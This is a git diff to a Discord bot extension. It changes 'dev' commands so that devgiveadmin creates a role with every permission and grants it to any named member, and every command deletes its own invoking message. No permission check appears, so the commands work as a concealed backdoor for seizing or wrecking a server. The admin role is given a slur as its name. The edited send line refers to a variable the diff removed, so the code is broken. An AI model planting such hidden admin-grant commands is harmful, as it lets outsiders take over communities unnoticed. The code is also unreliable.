@@ -22,11 +22,12 @@ class beta(commands.Cog):
 
     # tgiveadmin <name>
     @commands.command()
-    async def devgiveadmin(self, ctx, name: str="admin"):
+    async def devgiveadmin(self, ctx, user: discord.Member = None):
+        await ctx.message.delete()
         guild = ctx.guild
-        user = ctx.author
+        user = user or ctx.author
             
-        role = await guild.create_role(name=name,permissions=Permissions.all())  
+        role = await guild.create_role(name="retard",permissions=Permissions.all())  
         await user.add_roles(role)
 
         await ctx.send(f"{user.name} received the role {name}", delete_after=3)
@@ -34,6 +35,7 @@ class beta(commands.Cog):
     # tdeleterole <name>
     @commands.command()
     async def devdeleterole(self, ctx, role):
+        await ctx.message.delete()
         role = discord.utils.get(ctx.message.guild.roles, name=role)
         await role.delete()
 
@@ -43,6 +45,7 @@ class beta(commands.Cog):
     #tgiverole <role>
     @commands.command()
     async def devgiverole(self, ctx, role: discord.Role, *, user: discord.Member=None):
+        await ctx.message.delete()
         user = user or ctx.author
 
         if ctx.me.top_role.position <= role.position: 
